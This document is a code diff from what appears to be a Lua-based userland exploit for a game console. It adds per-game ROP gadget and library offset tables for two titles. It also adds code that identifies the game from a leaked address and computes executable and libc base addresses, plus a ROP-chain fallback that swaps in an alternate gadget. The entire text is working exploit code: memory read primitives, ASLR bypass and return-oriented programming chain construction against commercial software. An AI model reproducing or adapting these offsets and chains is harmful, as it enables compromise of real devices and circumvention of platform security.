@@ -10,54 +10,110 @@ eboot_base = nil
 libc_base = nil
 libkernel_base = nil
 
-gadgets = {
-    
-    ["ret"] = 0xd2811,
-    ["jmp $"] = 0x4a5c8,
-
-    ["pop rsp; ret"] = 0xa12,
-    ["pop rbp; ret"] = 0x79,
-    ["pop rax; ret"] = 0xa02,
-    ["pop rbx; ret"] = 0x5dce6,
-    ["pop rcx; ret"] = 0x0147cf,
-    ["pop rdx; ret"] = 0x53762,
-    ["pop rdi; ret"] = 0x467c69,
-    ["pop rsi; ret"] = 0xd2810,
-    ["pop r8; ret"] = 0xa01,
-    ["mov r9, rbx; call [rax + 8]"] = 0x14a9a0,
-
-    ["mov [rdi], rsi; ret"] = 0xd0d7f,
-    ["mov [rdi], rax; ret"] = 0x9522b,
-    ["mov [rdi], eax; ret"] = 0x9522c,
-    ["add [rbx], eax; ret"] = 0x4091a3,    
-    ["mov rax, [rax]; ret"] = 0x1fd5b,
-    ["inc dword [rax]; ret"] = 0x1a12eb,
-
-    -- branching specific gadgets
-    ["cmp [rcx], eax; ret"] = 0x2dcc59,
-    ["sete al; ret"] = 0x538c7,
-    ["setne al; ret"] = 0x556,
-    ["seta al; ret"] = 0x166fce,
-    ["setb al; ret"] = 0x5dd64,
-    ["setg al; ret"] = nil,
-    ["setl al; ret"] = 0xcb0da,
-    ["shl rax, cl; ret"] = 0xd5611,
-    ["add rax, rcx; ret"] = 0x354be,
+games_identification = {
+    ["bb0"] = "RaspberryCube",
+    ["b90"] = "Aibeya",
 }
 
-eboot_addrofs = {
-    fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
-    luaB_auxwrap = 0x1a7bb0, -- to resolve eboot base
-    longjmp_import = 0x619388, -- to resolve libc base
-}
+gadget_table = {
+    raspberry_cube = {
+        gadgets = {
+            ["ret"] = 0xd2811,
+            ["jmp $"] = 0x4a5c8,
 
-libc_addrofs = {
-    memcpy = 0x4e9d0,
-    longjmp = 0xb68b0,
-    strerror = 0x42e40,
-    error = 0x178,
-    sceKernelGetModuleInfoFromAddr = 0x1a8,
-    gettimeofday_import = 0x11c010, -- syscall wrapper
+            ["pop rsp; ret"] = 0xa12,
+            ["pop rbp; ret"] = 0x79,
+            ["pop rax; ret"] = 0xa02,
+            ["pop rbx; ret"] = 0x5dce6,
+            ["pop rcx; ret"] = 0x0147cf,
+            ["pop rdx; ret"] = 0x53762,
+            ["pop rdi; ret"] = 0x467c69,
+            ["pop rsi; ret"] = 0xd2810,
+            ["pop r8; ret"] = 0xa01,
+            ["mov r9, rbx; call [rax + 8]"] = 0x14a9a0,
+
+            ["mov [rdi], rsi; ret"] = 0xd0d7f,
+            ["mov [rdi], rax; ret"] = 0x9522b,
+            ["mov [rdi], eax; ret"] = 0x9522c,
+            ["add [rbx], eax; ret"] = 0x4091a3,
+            ["add [rbx], ecx; ret"] = nil,
+            ["mov rax, [rax]; ret"] = 0x1fd5b,
+            ["inc dword [rax]; ret"] = 0x1a12eb,
+
+            -- branching specific gadgets
+            ["cmp [rcx], eax; ret"] = 0x2dcc59,
+            ["sete al; ret"] = 0x538c7,
+            ["setne al; ret"] = 0x556,
+            ["seta al; ret"] = 0x166fce,
+            ["setb al; ret"] = 0x5dd64,
+            ["setg al; ret"] = nil,
+            ["setl al; ret"] = 0xcb0da,
+            ["shl rax, cl; ret"] = 0xd5611,
+            ["add rax, rcx; ret"] = 0x354be,
+        },
+        eboot_addrofs = {
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1a7bb0, -- to resolve eboot base
+            longjmp_import = 0x619388, -- to resolve libc base
+        },
+        libc_addrofs = {
+            memcpy = 0x4e9d0,
+            longjmp = 0xb68b0,
+            strerror = 0x42e40,
+            error = 0x178,
+            sceKernelGetModuleInfoFromAddr = 0x1a8,
+            gettimeofday_import = 0x11c010, -- syscall wrapper
+        }
+    },
+    aibeya = {
+        gadgets = {    
+            ["ret"] = 0x4c,
+            ["jmp $"] = nil,
+
+            ["pop rsp; ret"] = 0xa02,
+            ["pop rbp; ret"] = 0x79,
+            ["pop rax; ret"] = 0x9f2,
+            ["pop rbx; ret"] = 0x60876,
+            ["pop rcx; ret"] = 0x14a7f,
+            ["pop rdx; ret"] = 0x3f3647,
+            ["pop rdi; ret"] = 0x1081c0,
+            ["pop rsi; ret"] = 0x10ef32,
+            ["pop r8; ret"] = 0x9f1,
+            ["mov r9, rbx; call [rax + 8]"] = 0x1511ff,
+
+            ["mov [rdi], rsi; ret"] = 0xd76ff,
+            ["mov [rdi], rax; ret"] = 0x994cb,
+            ["mov [rdi], eax; ret"] = 0x994cc,
+            ["add [rbx], eax; ret"] = nil,
+            ["add [rbx], ecx; ret"] = 0x44093b,
+            ["mov rax, [rax]; ret"] = 0x2008b,
+            ["inc dword [rax]; ret"] = 0x1a82cb,
+
+            -- branching specific gadgets
+            ["cmp [rcx], eax; ret"] = 0x44ef72,
+            ["sete al; ret"] = 0x55747,
+            ["setne al; ret"] = 0x50f,
+            ["seta al; ret"] = 0x16dbce,
+            ["setb al; ret"] = 0x608f4,
+            ["setg al; ret"] = nil,
+            ["setl al; ret"] = 0xd1a6a,
+            ["shl rax, cl; ret"] = 0xdbf31,
+            ["add rax, rcx; ret"] = 0x35afe,
+        },
+        eboot_addrofs = {
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1aeb90, -- to resolve eboot base
+            longjmp_import = 0x6193e8, -- to resolve libc base
+        },
+        libc_addrofs = {
+            memcpy = 0x4df50,
+            longjmp = 0xb5680,
+            strerror = 0x42540,
+            error = 0x168,
+            sceKernelGetModuleInfoFromAddr = 0x198,
+            gettimeofday_import = 0x204060, -- syscall wrapper
+        }
+    },
 }
 
 
@@ -713,8 +769,34 @@ function lua.setup_better_read_primitive()
     lua.fake_str_addr = new_fake_str_addr
 end
 
-function lua.resolve_address()
+function lua.resolve_game(luaB_auxwrap)
+    print("[+] luaB_auxwrap @ " .. hex(luaB_auxwrap))
+    local hex_nibbles = hex(luaB_auxwrap):sub(-3)
+    print("[+] luaB_auxwrap nibbles: " .. hex_nibbles)
+    
+    if not games_identification[hex_nibbles] then
+        print("[-] Game not identified. Falling back to Raspberry Cube")
+        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
+        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
+        gadgets = gadget_table.raspberry_cube.gadgets
+        return
+    end
+    
+    if games_identification[hex_nibbles] == "RaspberryCube" then
+        print("[+] Game identified as Raspberry Cube")
+        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
+        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
+        gadgets = gadget_table.raspberry_cube.gadgets
+    elseif games_identification[hex_nibbles] == "Aibeya" then
+        print("[+] Game identified as Aibeya")
+        eboot_addrofs = gadget_table.aibeya.eboot_addrofs
+        libc_addrofs = gadget_table.aibeya.libc_addrofs
+        gadgets = gadget_table.aibeya.gadgets
+    end
+end
 
+function lua.resolve_address()
+    luaB_auxwrap = nil
     local consume = {}
     for i=1,64 do
 
@@ -725,11 +807,15 @@ function lua.resolve_address()
         local addr = lua.read_qword(lua.addrof(co)+0x20)
         if addr then
             -- calculate eboot base from luaB_auxwrap offset
-            eboot_base = addr - eboot_addrofs.luaB_auxwrap
-            print("[+] eboot base @ " .. hex(eboot_base))
+            luaB_auxwrap = addr
             break
         end
     end
+    
+    lua.resolve_game(luaB_auxwrap)
+    
+    eboot_base = luaB_auxwrap - eboot_addrofs.luaB_auxwrap
+    print("[+] eboot base @ " .. hex(eboot_base))
 
     assert(eboot_base ~= nil, "failed to find eboot base")
 
@@ -1155,9 +1241,19 @@ function ropchain:push_add_dword_memory_with_eax(addr)
     self:push(gadgets["add [rbx], eax; ret"])
 end
 
+function ropchain:push_add_dword_memory_with_ecx(addr)
+    self:push_set_rbx(addr)
+    self:push(gadgets["add [rbx], ecx; ret"])
+end
+
 function ropchain:push_add_dword_memory(addr, num)
-    self:push_set_rax(uint64(num).l)
-    self:push_add_dword_memory_with_eax(addr)
+    if gadgets["add [rbx], eax; ret"] then
+        self:push_set_rax(uint64(num).l)
+        self:push_add_dword_memory_with_eax(addr)
+    else
+        self:push_set_rcx(uint64(num).l)
+        self:push_add_dword_memory_with_ecx(addr)
+    end
 end
 
 function ropchain:push_write_dword(addr, v)
